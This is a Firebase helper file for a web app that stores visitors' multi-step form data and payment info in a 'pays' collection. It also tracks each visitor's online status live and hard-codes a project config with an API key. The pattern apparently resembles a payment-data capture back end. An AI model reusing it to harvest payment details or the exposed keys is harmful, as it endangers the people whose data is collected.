// firebase.js
import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc,updateDoc } from 'firebase/firestore';
import { clsx, type ClassValue } from "clsx"
import { onDisconnect, onValue, ref, serverTimestamp, set } from "firebase/database";
import { twMerge } from "tailwind-merge"

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs))
}
export const onlyNumbers = (value: string) => {
  return value.replace(/[^\d٠-٩]/g, '');
};



export const setupOnlineStatus = (userId: string) => {
  if (!userId) return;

  // Create a reference to this user's specific status node in Realtime Database
  const userStatusRef = ref(database, `/status/${userId}`);

  // Create a reference to the user's document in Firestore
  const userDocRef = doc(db, "pays", userId);

  // Set up the Realtime Database onDisconnect hook
  onDisconnect(userStatusRef)
    .set({
      state: "offline",
      lastChanged: serverTimestamp(),
    })
    .then(() => {
      // Update the Realtime Database when this client connects
      set(userStatusRef, {
        state: "online",
        lastChanged: serverTimestamp(),
      });

      // Update the Firestore document
      updateDoc(userDocRef, {
        online: true,
        lastSeen: serverTimestamp(),
      }).catch((error) =>
        console.error("Error updating Firestore document:", error)
      );
    })
    .catch((error) => console.error("Error setting onDisconnect:", error));

  // Listen for changes to the user's online status
  onValue(userStatusRef, (snapshot) => {
    const status = snapshot.val();
    if (status?.state === "offline") {
      // Update the Firestore document when user goes offline
      updateDoc(userDocRef, {
        online: false,
        lastSeen: serverTimestamp(),
      }).catch((error) =>
        console.error("Error updating Firestore document:", error)
      );
    }
  });
};

export const setUserOffline = async (userId: string) => {
  if (!userId) return;

  try {
    // Update the Firestore document
    await updateDoc(doc(db, "pays", userId), {
      online: false,
      lastSeen: serverTimestamp(),
    });

    // Update the Realtime Database
    await set(ref(database, `/status/${userId}`), {
      state: "offline",
      lastChanged: serverTimestamp(),
    });
  } catch (error) {
    console.error("Error setting user offline:", error);
  }
};
export const trackFormProgress = async (visitorId: string, currentPage: number, formData: any) => {
  const progressData = {
    id: visitorId,
    currentPage,
    progress: Math.round((currentPage / 7) * 100),
    completedSteps: currentPage - 1,
    totalSteps: 7,
    formData,
    timestamp: new Date().toISOString(),
  }

  return await addData(progressData)
}
const firebaseConfig = {
  apiKey: "AIzaSyDJOaDkXvm5XP3-Fu0LsuKvQ0_dZK5uf-k",
  authDomain: "school-77936.firebaseapp.com",
  databaseURL: "https://school-77936-default-rtdb.firebaseio.com",
  projectId: "school-77936",
  storageBucket: "school-77936.firebasestorage.app",
  messagingSenderId: "783345000886",
  appId: "1:783345000886:web:585c7579926bcb8f0ca117",
  measurementId: "G-XX9L099J8H"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef,   { ...data },{merge:true});

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export { db,database };